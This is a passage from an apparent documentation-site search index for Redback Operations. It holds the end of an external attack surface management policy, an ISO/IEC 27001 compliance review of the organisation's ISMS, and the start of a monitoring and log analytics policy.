manage response efforts by prioritizing risks that pose the greatest threat to the organization's security and operational stability.  Risk Prioritization Involves:  Risk Scoring and MatrixImplement a quantitative &amp; qualitative scoring system to prioritize risks based on their severity and likelihood. Use a risk matrix to visually categorize and prioritize risks, aiding in effective resource allocation.  Regulatory Impact ConsiderationRegularly review and align risk prioritization with compliance and regulatory requirements, ensuring that risks with legal implications are promptly and adequately addressed.   Risk Mitigation​  OverviewActions and strategies are implemented to reduce the severity or likelihood of prioritized risks, or to shield the organization from their impact.  PurposeTo deploy effective control measures that prevent, reduce, or transfer risks, thereby enhancing the security of external-facing assets.  Risk Mitigation Involves:  Implementation of Security ControlsBased on the risk assessment outcomes, appropriate security controls are selected and implemented. These may include technical controls (such as firewalls, intrusion detection systems, and encryption), administrative controls (such as security policies and training), and physical controls (such as access control systems and surveillance).  Regular Updates and Patch ManagementEnsuring that all software and systems are kept up to date with the latest security patches is crucial. A structured patch management process is maintained to quickly apply patches to vulnerable systems, reducing the window of opportunity for attackers.  Enhancing Security ArchitecturesContinuous improvement of security architectures is essential for defending against sophisticated threats. This may involve segregating networks, strengthening endpoints, and implementing advanced threat detection technologies.  Configuration ManagementProper configuration of IT systems and applications is vital to eliminating unnecessary vulnerabilities. Standardized configurations that adhere to industry best practices are developed and implemented, and continuous configuration monitoring is conducted to ensure compliance.  Training and Awareness ProgramsEmployees are regularly trained on security best practices and the specific tactics, techniques, and procedures used by threat actors. This training includes how to recognize phishing attempts, the importance of using strong passwords, and the safe handling of data.  Redundancy and Failover ProcessesTo ensure availability and continuity of operations, redundancy is built into critical systems and networks. Failover processes are established to switch to backup systems automatically in the event of a system failure or breach.     Risk Remediation​  OverviewThe process of applying specific solutions or changes to fully resolve vulnerabilities or eliminate risks.  PurposeTo ensure that once risks are identified and assessed, they are effectively neutralized or managed to acceptable levels.  Risk Remediation Involves:  Immediate ContainmentWhen a critical vulnerability is identified, immediate steps are taken to contain its potential impact. This may involve temporary fixes or workarounds that prevent the exploitation of the vulnerability while a permanent solution is being developed.  Developing Remediation PlansFor each identified risk, a tailored remediation plan is developed. This plan outlines the steps required to address the vulnerability, assigns responsibilities to specific teams or individuals, and sets deadlines for resolving the issues.  Implementing ChangesDepending on the nature of the risk, remediation may involve software updates, changes to system configurations, enhancements to security policies, or physical security improvements. Each action is carefully implemented to ensure that it effectively resolves the identified risks without introducing new vulnerabilities.  Testing and ValidationAfter remedial actions are implemented, they are thoroughly tested to confirm that the risk has been effectively mitigated. This testing may involve repeat scans, penetration tests, or other assessment methods to ensure that the vulnerability no longer poses a threat.  DocumentationComprehensive documentation of the remediation process is maintained, including details of the vulnerability, the analysis performed, the remediation steps taken, and the results of post-remediation testing.  Feedback and ImprovementThe effectiveness of the remediation process is reviewed, and feedback is gathered to improve future risk remediation efforts. Lessons learned are integrated into the organization's risk management practices to enhance overall security posture.   Documentation and Reporting​  OverviewEssential for maintaining records of risk management activities, decisions, and outcomes, and for communicating the ongoing status of risk to relevant stakeholders.  PurposeTo provide transparency, support compliance, and facilitate informed decision-making by keeping comprehensive records and reporting on risk management performance.  Risk Remediation Involves:  Dynamic Risk RegisterMaintain an up-to-date risk register that records all identified risks, their severity, mitigation actions, and resolution status. This register serves as a central repository for tracking and managing risks across the organization.  Regular Risk ReportingGenerate and disseminate regular risk reports to senior management and relevant stakeholders. These reports should highlight current risk levels, mitigation efforts, and any changes in the risk landscape.  With a structured approach to risk assessment and management, Redback Operations can effectively minimize vulnerabilities and threats to its external attack surface. The next step in developing the policy involves outlining the roles and responsibilities of individuals and departments within the organization.  ","version":"Next","tagName":"h3"},{"title":"Established Security Controls​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#established-security-controls","content":" To safeguard its external attack surface, Redback Operations will implement a comprehensive set of security measures and controls. These controls are designed to protect against unauthorized access, data breaches, and other cyber threats.  Note: This section refers to adherence to the ISMS in reference to established security frameworks, such as Essential 8, CIS Security Controls or ISO27001. Refer to the relevant ISMS policy for further details.  ","version":"Next","tagName":"h2"},{"title":"Technical Controls​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#technical-controls","content":" Firewalls and Intrusion Prevention Systems (IPS)Advanced firewall technologies are utilized, such as IPS to monitor, control, and block malicious traffic based on dynamic rule sets.  Ports &amp; Services are restricted on Gateway devices to allow external access from public sources unless required for functionality purposes.  Vulnerability ManagementRegularly scheduled vulnerability scans and automated discovery tooling is used for continuous threat detection and response.  EncryptionEnd-to-end encryption protocols are implemented for all data in transit and at rest, using industry-standard algorithms to ensure data confidentiality and integrity.  Access ControlAccess control systems are implemented, incorporating multi-factor authentication (MFA) and role-based access controls (RBAC) to regulate access to sensitive information and systems.  Web Application Firewalls (WAF)WAF’s are deployed to protect against web-based attacks by filtering and monitoring web traffic.  Secure Software Development Life Cycle (SDLC)Secure coding principles are implemented at every phase of the software development process to identify and mitigate vulnerabilities early during development.  Network SegmentationNetworks are divided into subnetworks to limit an attacker's ability to move laterally within the network and to contain potential breaches.  Security Information and Event Management (SIEM)SIEM systems provide real-time analysis of security alerts generated by network hardware and applications.   ","version":"Next","tagName":"h3"},{"title":"Administrative Controls​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#administrative-controls","content":" Security Policies and ProceduresComprehensive security policies and procedures addressing all aspects of organizational security are regularly updated and enforced.  Risk ManagementA formalized risk management framework is established to systematically identify, assess, mitigate, and monitor organizational risks.  Security Training and AwarenessRegular training sessions and continuous awareness programs educate employees on security best practices and threat awareness.  Incident Response PlanA detailed incident response plan is maintained, outlining roles, responsibilities, and procedures for managing and recovering from security incidents.  Data Protection PoliciesPolicies focused on data protection, including data retention, data destruction, and data leakage prevention, are implemented, and adhered to.  Third-Party Risk ManagementSecurity risks associated with third-party vendors and service providers are assessed and managed through regular audits and compliance checks.  ","version":"Next","tagName":"h3"},{"title":"Physical Controls​","type":1,"pageTitle":"External Attack Surface Management","url":"/redback-documentation/docs/company-policy/ISMS/easm#physical-controls","content":" Secure Data CentresAdvanced physical security measures such as biometric access controls, CCTV surveillance, and security patrols protect physical data centres and server rooms.  Visitor Access ControlsStrict access protocols for visitors are enforced, including escorted access, visitor logs, and time-limited access badges.  Physical Device SecurityCable locks, secure enclosures, and other physical restraints are used to prevent unauthorized removal of devices. ","version":"Next","tagName":"h3"},{"title":"ISMS Review","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#introduction","content":" The scope of this review is to analyse the current ISMS (Information Security Management System) to ensure it is compliant with the ISO/IEC 27001 standard. A checklist was created which contained each requirement of an ISMS policy and used against the current policy to make sure it is compliant.  Each section is based off the number of requirements needed for an ISMS policy as told from ISO/IEC 27001. Sections may not contain notes as they are already compliant with the standard. The section structure of the current policy should also mimic this unless otherwise noted  This assessment was conducted on the 31st of July 2024 and the report was completed on the 1st of August 2024  ","version":"Next","tagName":"h2"},{"title":"1. Scope​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#1-scope","content":" Is compliant with ISO/IEC 27001 standard? - YES  Scope is well written and fits the requirements needed. No work is needed for this section. But work outside of the ISMS policy might be needed to create policies for each of the assets listed in the scope. As some have policies and some do not  Policies that need to be created:  • Cloud security  • BYOD &amp; MDM  ","version":"Next","tagName":"h2"},{"title":"2. Normative References​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#2-normative-references","content":" Is compliant with ISO/IEC 27001 standard? - NO  As stated in the policy, this section isn’t applicable to Redback. Was only included to ensure section numbering was in line with ISO/IEC 27001. There is no way to improve on this as it would require a more detailed ISMS policy  ","version":"Next","tagName":"h2"},{"title":"3. Terms and Definitions​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#3-terms-and-definitions","content":" Is compliant with ISO/IEC 27001 standard? - NO  There are no references made to ISO/IEC 27000. It is unclear if there are terms used throughout the document that may need to be specified. This could be due to the detail of the policy that those references may not have been needed  ","version":"Next","tagName":"h2"},{"title":"4. Context of the Organisation​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#4-context-of-the-organisation","content":" ","version":"Next","tagName":"h2"},{"title":"4.1 Understanding the organisation and it's context​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#41-understanding-the-organisation-and-its-context","content":" Is compliant with ISO/IEC 27001 standard? – YES  ","version":"Next","tagName":"h3"},{"title":"4.2 Understanding the needs and expectations of interested parties​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#42-understanding-the-needs-and-expectations-of-interested-parties","content":" Is compliant with ISO/IEC 27001 standard? - YES  Needs more detail on which requirements will be addressed through the ISMS. Contains the needs and expectations of all interested parties but only list’s them and doesn’t go into detail about each one. This could be an area to improve on  ","version":"Next","tagName":"h3"},{"title":"4.3 Determining the scope of the information security management system​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#43determining-the-scope-of-the-information-security-management-system","content":" Is compliant with ISO/IEC 27001 standard? – YES  Does an excellent job of determining the scope. But needs to consider requirements referred to in 4.2 which there were none listed.  ","version":"Next","tagName":"h3"},{"title":"4.4 Information security management system​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#44-information-security-management-system","content":" Is compliant with ISO/IEC 27001 standard? - YES  Well-written and fits the requirements. However, it refers to “section 12” which will have links to “appropriate” documentation/policies which can provide further explanation. Examining section 12, there are no links provided to said documentation and some of the assets mentioned don’t have policies created for them  ","version":"Next","tagName":"h3"},{"title":"5. Leadership​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#5-leadership","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Leadership and commitment​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#51-leadership-and-commitment","content":" Is compliant with ISO/IEC 27001 standard? - NO  Needs more detail on how these policies will be implemented and be maintained. That could potentially be beyond the scope of the company and unit  ","version":"Next","tagName":"h3"},{"title":"5.2 Policy​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#52-policy","content":" Is compliant with ISO/IEC 27001 standard? - NO  Makes references to links to documents in section 12. As stated, there are no links to other policies present in that section. This will need to be rectified at some point as this is an important requirement that all documentation should be available  ","version":"Next","tagName":"h3"},{"title":"5.3 Organizational roles, responsibilities and authorities​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#53-organizational-roles-responsibilities-and-authorities","content":" Is compliant with ISO/IEC 27001 standard? – YES  ","version":"Next","tagName":"h3"},{"title":"6. Planning​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#6-planning","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Actions to address risks and opportunities​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#61-actions-to-address-risks-and-opportunities","content":" 6.1.1 General​  Is compliant with ISO/IEC 27001 standard? - YES  6.1.2 Information security risk assessment​  Is compliant with ISO/IEC 27001 standard? - NO  This section states that a Risk analysis should be created alongside the ISMS. No analysis has been linked or created. Could this be something that can potentially be done?  6.1.3 Information security risk treatment​  Is compliant with ISO/IEC 27001 standard? - NO  Same as above (6.1.2). No treatment has been linked or created  ","version":"Next","tagName":"h3"},{"title":"6.2 Information security objectives and planning to achieve them​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#62-information-security-objectives-and-planning-to-achieve-them","content":" Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as 6.1.4. Needs to be fixed to be in line with ISO/IEC 27001 standard. Potentially more detail is needed on how the company plans to achieve these objectives  ","version":"Next","tagName":"h3"},{"title":"6.3 Planning of changes​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#63planning-of-changes","content":" Is compliant with ISO/IEC 27001 standard? - NO  Not present in the document. Unknown if it fits with the scope of the unit  ","version":"Next","tagName":"h3"},{"title":"7. Support​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#7-support","content":" ","version":"Next","tagName":"h2"},{"title":"7.1 Resources​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#71resources","content":" Is compliant with ISO/IEC 27001 standard? - NO  As stated in the policy, Redback Operations doesn’t have the same resources as a typical IT organisation. As all roles are split between students.  ","version":"Next","tagName":"h3"},{"title":"7.2 Competence​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#72competence","content":" Is compliant with ISO/IEC 27001 standard? - YES  States that training maybe required to bring Staff and students are working within the ISMS. Would it be worth creating training documents or videos to cover all bases?  ","version":"Next","tagName":"h3"},{"title":"7.3 Awareness​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#73awareness","content":" Is compliant with ISO/IEC 27001 standard? - YES  All documentation that has been created is available on the website and is accessible to all  ","version":"Next","tagName":"h3"},{"title":"7.4 Communication​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#74communication","content":" Is compliant with ISO/IEC 27001 standard? - YES  ","version":"Next","tagName":"h3"},{"title":"7.5 Documented Information​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#75documented-information","content":" 7.5.1 General​  Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as Section 8.1 in the current policy. Is meant to be 7.5.1 to fit the standard  7.5.2 Creating and Updating​  Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as Section 8.2 in the current policy. Is meant to be 7.5.2 to fit the standard  7.5.3 Control of Documented Information​  Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as Section 8.3 in the current policy. Is meant to be 7.5.3 to fit the standard  ","version":"Next","tagName":"h3"},{"title":"8. Operation​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#8-operation","content":" ","version":"Next","tagName":"h2"},{"title":"8.1 Operational planning and control​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#81operational-planning-and-control","content":" Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as Section 9.1 in the current policy. Is meant to be 8.1 to fit the standard  ","version":"Next","tagName":"h3"},{"title":"8.2 Information security risk assessment​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#82information-security-risk-assessment","content":" Is compliant with ISO/IEC 27001 standard? - NO  Not present in the current policy. As with 6.1.2, the risk assessment hasn’t been linked or created  ","version":"Next","tagName":"h3"},{"title":"8.3 Information security risk treatment​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#83information-security-risk-treatment","content":" Is compliant with ISO/IEC 27001 standard? - NO  Not present in the current policy. As with 6.1.3, the risk treatment hasn’t been linked or created  ","version":"Next","tagName":"h3"},{"title":"9. Performance Evaluation​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#9-performance-evaluation","content":" ","version":"Next","tagName":"h2"},{"title":"9.1 Monitoring, measurement, analysis and evaluation​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#91monitoring-measurement-analysis-and-evaluation","content":" Is compliant with ISO/IEC 27001 standard? - YES  Labelled as Section 10.1 in the current policy. Needs to be renamed to 9.1 to be in line with ISO/IEC 27001 standard  ","version":"Next","tagName":"h3"},{"title":"9.2 Internal Audit​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#92internal-audit","content":" 9.2.1 General​  Is compliant with ISO/IEC 27001 standard? - YES  Shares the same as the previous requirement. Mislabelled as 10.2. Needs to be renamed to 9.2.1 to be in line with ISO/IEC 27001 standard  9.2.2 Internal Audit programme​  Is compliant with ISO/IEC 27001 standard? - NO  Not present in current policy. However, this could be due to the size of the company  ","version":"Next","tagName":"h3"},{"title":"9.3 Management review​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#93management-review","content":" 9.3.1 General​  Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as 10.3. Needs to be renamed to 9.3.1 to be in line with ISO/IEC 27001 standard  9.3.2 Management review inputs​  Is compliant with ISO/IEC 27001 standard? - NO  Not present in current policy. However, may not be applicable to Redback Operations as it doesn’t have a typical management structure and as such the guidelines set in the standard would not be applied. But it does state that company goals and policies should be reviewed when necessary  9.3.3 Management review results​  Is compliant with ISO/IEC 27001 standard? - NO  As stated for 9.3.2, a management review isn’t applicable to Redback Operations  ","version":"Next","tagName":"h3"},{"title":"10. Improvement​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#10-improvement","content":" ","version":"Next","tagName":"h2"},{"title":"10.1 Continual Improvement​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#101-continual-improvement","content":" Is compliant with ISO/IEC 27001 standard? - YES  More detail is potentially needed to specify how the company will do this. Mislabelled as Section 11.2 in the current policy. Needs to be renamed to 10.1 to be in line with ISO/IEC 27001 standard  ","version":"Next","tagName":"h3"},{"title":"10.2 Nonconformity and corrective action​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#102-nonconformity-and-corrective-action","content":" Is compliant with ISO/IEC 27001 standard? - YES  Mislabelled as Section 11.1. Needs to be renamed to 10.2 to be in line with ISO/IEC 27001 standard  ","version":"Next","tagName":"h3"},{"title":"Summary​","type":1,"pageTitle":"ISMS Review","url":"/redback-documentation/docs/company-policy/Policy Reviews/isms-review#summary","content":" The current policy is on the right track to being ISO/IEC 27001 certified. However, there are some sections that either don’t exist or require more detail to be compliant. The overall requirement structure was mostly adhered to, but all the later sections have the wrong numbering structure and as such made it difficult to keep track of each requirement. As mentioned throughout this review, Section 12 is supposed to have links to other policies that are referenced in the policy but there are no links present currently. This needs to be addressed. There also needs to be policies created for some of the assets mentioned in the scope (those are listed in its respective section). ","version":"Next","tagName":"h2"},{"title":"Monitoring & Log Analytics","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics","content":"","keywords":"","version":"Next"},{"title":"Scope​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#scope","content":" The Monitoring &amp; Log Analytics Cyber Security Policy will apply to all IT systems and networks owned or operated by Redback Operations.  Monitoring in the context of this policy refers to the continuous oversight of IT infrastructure, which includes servers, networks, applications, and systems, to ensure operational stability and security.  It involves the real-time scanning and analysis of data to detect, alert, and respond to potential performance issues or security threats.  Log Analytics is the process of using tools to collect, aggregate, normalize, and analyse log data from various sources within the IT environment. This practice is essential for understanding the behaviour of systems, diagnosing problems, ensuring compliance with regulatory standards, and maintaining security across all operations.  Log analytics supports the identification of trends, unexpected occurrences, and potential security breaches by analysing the historical data provided by logs.  Note: This policy is a high-level policy that refers to a theoretical future deployment of a SIEM/SOC solution for Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"Current State Vs Target State​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#current-state-vs-target-state","content":" **Note: The current layout and infrastructure of Redback Operations do not yet support the full implementation of this policy. The practices outlined herein reflect a future state goal. As of now, the company is in the process of maturing its monitoring and log analytics capabilities. Where applicable, sections in this policy will specify whether a feature or standard is currently in use or part of a target implementation roadmap. **  ","version":"Next","tagName":"h3"},{"title":"Purpose​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#purpose","content":" This monitoring and log analytics policy is designed to support Redback Operations in achieving and maintaining high standards of security and compliance throughout its operations. The purpose of this policy is multi-faceted and supports our commitment to maintaining the integrity, confidentiality, and availability of our data and systems.  Objectives​  The objectives that this policy intends to achieve are:  Enhance Security Posture Proactively identify, assess, and mitigate risks and threats to our infrastructure and data assets. Achieve Compliance and adhere to Regulatory Requirements Guarantee that all monitoring and log analytics practices strictly adhere to applicable legal, regulatory, and contractual obligations, thereby safeguarding the organization against legal and financial repercussions. Achieve Operational Excellence Monitor and analyse system performance and reliability continuously to ensure optimal operation, system availability, and ensure business continuity. Enhance and Allow for Incident Management and Response Establish and maintain a proactive, structured approach for timely detection, thorough analysis, and effective response to security incidents to minimize their impact and prevent recurrence. Provide Forensic Capabilities Ensure detailed and accurate logging practices are in place to support forensic investigations and establish accountability and traceability within our systems. Ensure Confidentiality, Integrity, and Availability (CIA) of company systems, applications, infrastructure &amp; operations. The policy, in alignment with the Redback Operations Information Security Management System, aims to safeguard the “CIA” of all operational and sensitive data across the organization. Threat Detection and Analysis Establish standards, guidelines and control processes to actively monitor and analyse data traffic and usage patterns across all systems and networks to quickly identify and mitigate potential security threats and breaches.  This policy is essential not only for achieving technical and operational goals but also for fostering a culture of security and compliance at all levels of the organization. It serves as a foundational security policy for guiding and securing technical systems implemented within Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Common Terminology​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#common-terminology","content":" This sub-heading refers to common terminology, components, KPI &amp; KGI indicators covered under this policy:  Definitions​  The table provided below presents the expanded definitions and components list relevant to the Monitoring &amp; Log Analytics Cyber Security Policy:  Term\tDefinitionLogs\tData records that systematically capture events or actions within an IT environment, providing a traceable and chronological sequence of activities. Log Management\tThe process of collecting, storing, archiving, and disposing of logs in a secure and controlled manner, covering the entire lifecycle from log creation to destruction. Monitoring\tContinuous observation of real-time or recorded logs to identify patterns, anomalies, and potential security threats, aimed at proactive threat detection and system health monitoring. Audit Trails\tRecords that provide documentary evidence of the sequence and context of activities that have affected specific operations, procedures, or events, crucial for compliance and forensic analysis. Event Correlation\tA technique used to identify relationships between various events logged across different systems, aiding in pinpointing security incidents by connecting related anomalies. Anomaly Detection\tThe process of identifying patterns in log data that do not conform to expected behaviour, key in spotting potential security breaches or system failures early. Threat Intelligence\tInformation used to understand the capabilities, infrastructure, motives, goals, and actions of potential attackers, integrated into monitoring tools to enhance threat detection. Data Retention\tThe policy and process determining how long log data should be retained based on legal, regulatory, and operational requirements, ensuring compliance while minimizing storage overhead. Security Information and Event Management (SIEM)\tA solution that aggregates and analyses activity from many different resources across your IT infrastructure, used for real-time analysis of security alerts generated by applications and network hardware. Forensic Analysis\tThe detailed investigation of logs and other data following a security incident, aimed at understanding the actions that led to the incident and gathering evidence.  Guiding Principles​  Here’s a table that details the guiding principles relevant to the Monitoring &amp; Log Analytics Cyber Security Policy:  Principle\tDescriptionComprehensiveness\tEnsures all relevant data is captured, providing a detailed and complete view of system and user activities. Security\tMandates that logs and their management processes adhere to the highest standards of data protection. Accessibility\tBalances the need for security with the requirement that logs be easily accessible to authorized personnel. Integrity\tGuarantees that logging information remains accurate, complete, and unaltered except by authorized processes. Efficiency\tEncourages the design of logging and monitoring processes that maximize resource use and operational performance. Scalability\tEnsures that log management systems can scale with organizational growth or an increase in data volume. Resilience\tAims to maintain continuous operation of logging and monitoring systems, even in the face of failures.  General Obligations:​  Here’s a table that details the obligations that Redback Operations adheres to through the Monitoring &amp; Log Analytics Cyber Security Policy:  Principle\tDescriptionComprehensiveness\tEnsures all relevant data is captured, providing a detailed and complete view of system and user activities. Security\tMandates that logs and their management processes adhere to the highest standards of data protection. Accessibility\tBalances the need for security with the requirement that logs be easily accessible to authorized personnel. Integrity\tGuarantees that logging information remains accurate, complete, and unaltered except by authorized processes. Efficiency\tEncourages the design of logging and monitoring processes that maximize resource use and operational performance. Scalability\tEnsures that log management systems can scale with organizational growth or an increase in data volume. Resilience\tAims to maintain continuous operation of logging and monitoring systems, even in the face of failures.  ","version":"Next","tagName":"h3"},{"title":"Key Assets and Data Categories​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#key-assets-and-data-categories","content":" For Redback Operations, identifying the critical systems, applications, and data sets that require monitoring and logging is crucial. This includes any sensitive information that needs heightened security measures. Here are typical IT assets and data categories that are critical:  IT Assets: Servers (web, application, database)Network devices (routers, switches, firewalls)End-user devices (laptops, smartphones)Cloud services and storage solutionsCritical software applications (CRM, ERP, custom applications) Data Categories: Customer data (personal identification information, payment details)Employee data (personal details, HR records)Intellectual property (trade secrets, proprietary technology)Financial data (transaction records, financial reports)Operational data (logs, configuration files)  These assets and data types require robust monitoring to ensure they are protected from unauthorized access, modifications, or any other cyber threats.  ","version":"Next","tagName":"h3"},{"title":"Risk-Based Log Prioritisation​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#risk-based-log-prioritisation","content":" To ensure resources are directed efficiently, Redback Operations classifies assets into risk tiers based on impact and likelihood:  High-Risk Assets:  Customer PII systems, Financial databases, Core business apps.Must be logged in real-time, retained for a minimum of 24 monthsLower alert thresholds, more frequent audits.  Medium-Risk Assets:  Internal comms platforms, endpoint systems.Logged in near real-time, retained for 12–18 months.  Low-Risk Assets:  Non-sensitive operational systems.Logged daily or hourly based on activity, retained for 6–12 months.  This risk classification guides monitoring granularity, frequency, retention, and alert tuning.  ","version":"Next","tagName":"h3"},{"title":"Framework References​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#framework-references","content":" The Monitoring and Log Analytics Policy leverages the following framework controls to ensure a robust approach to information security and risk management:  ISO 27001:2022 Controls:​  A.12.1 Operations Security: Involves correct and secure operations of information processing facilities to enhance the overall security of operations.A.12.4 Logging and Monitoring: Ensures that events are recorded and analysed to detect, prevent, and recover from security incidents.A.12.7 Information Systems Audit Considerations: Manages the audit of information systems to ensure compliance with security policies and standards without disrupting business processes.A.16.1 Management of Information Security Incidents and Improvements: Focuses on ensuring a consistent and effective approach to the management of information security incidents, including communications on security events.  CIS Controls:​  Control 3: Data Protection: Protects data through controls that enforce confidentiality and integrity, ensuring availability as required for monitoring and logging purposes.Control 6: Audit Log Management: Focuses on the collection, management, and analysis of audit logs to help detect and understand security incidents.Control 8: Malware Defences: Ensures that devices are monitored and protected against malware infections and activities.Control 16: Account Monitoring and Control: Involves managing the lifecycle of user and service accounts, including monitoring the use of these accounts to detect unauthorized access.Control 19: Incident Response and Management: Provides a structured method for managing the aftermath of security breaches or attacks, including establishing processes to ensure timely response to incidents.  These controls have been specifically selected to enhance the effectiveness of the Monitoring and Log Analytics Policy by aligning it with recognized best practices for security monitoring, data protection, and incident management. This alignment not only improves security posture but also ensures regulatory compliance and operational efficiency in handling security threats and incidents.    ","version":"Next","tagName":"h3"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#roles-and-responsibilities","content":" For Redback Operations, clearly defined roles and responsibilities are essential to maintain an effective monitoring and log management system. Here are the typical roles involved and their respective duties:  Chief Information Security Officer (CISO)​  Oversees the cybersecurity strategy, including monitoring and log analytics policies.Ensures that all monitoring and log management practices comply with internal and external regulations.  IT Security Manager​  Manages the daily operations of security systems and ensures the effective implementation of the log analytics policy.Leads the security team in developing and maintaining security protocols.  Network Administrator​  Responsible for the management and monitoring of network devices including routers, switches, and firewalls.Ensures that all network configurations align with the security standards.  System Administrator​  Oversees the monitoring of all server and end-user devices.Manages the collection, storage, and maintenance of log data from servers and other critical systems.  Database Administrator​  Monitors database operations and ensures that access logs are maintained and reviewed.Responsible for the security and integrity of database assets.  Application Manager​  Ensures that all application logs are collected and analysed.Monitors the performance of business-critical applications and ensures they meet the required standards.  Security Analyst​  Analyses log data to identify, investigate, and respond to potential security threats.Acts quickly to mitigate any detected threats or breaches.  Compliance Officer​  Monitors compliance with legal and regulatory requirements pertaining to log management and cybersecurity.Coordinates internal and external audits of cybersecurity practices.  IT Support Staff​  Provides support to end-users on security best practices and assists with incident response.Assists in the management of monitoring tools and systems.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/company-policy/ISMS/monitoring-log-analytics#raci-chart","content":" A RACI chart is a valuable management tool used to delineate the roles and responsibilities across different team members for specific activities within a project or process. It clarifies expectations, enhances communication, and ensures clear ownership of tasks, aiding in project and process management.  Role\tCISO\tIT Security Manager\tNetwork Admin\tSystem Admin\tDatabase Admin\tApplication Manager\tSecurity Analyst\tCompliance Officer\tIT Support StaffDevelop and update security policies\tA\tR\t-\t-\t-\t-\t-\tC\t- Implement security measures\t-\tA\tR\tR\tR\tR\t-\t-\t- Daily monitoring of systems\t-\t-\tR\tR\tR\tR\tR\t-\tR Manage security incidents\tC\tA\t-\tC\tC\tC\tR\t-\tC Compliance and audits\tC\tC\t- C\t-\t-\tA\t- Policy training and 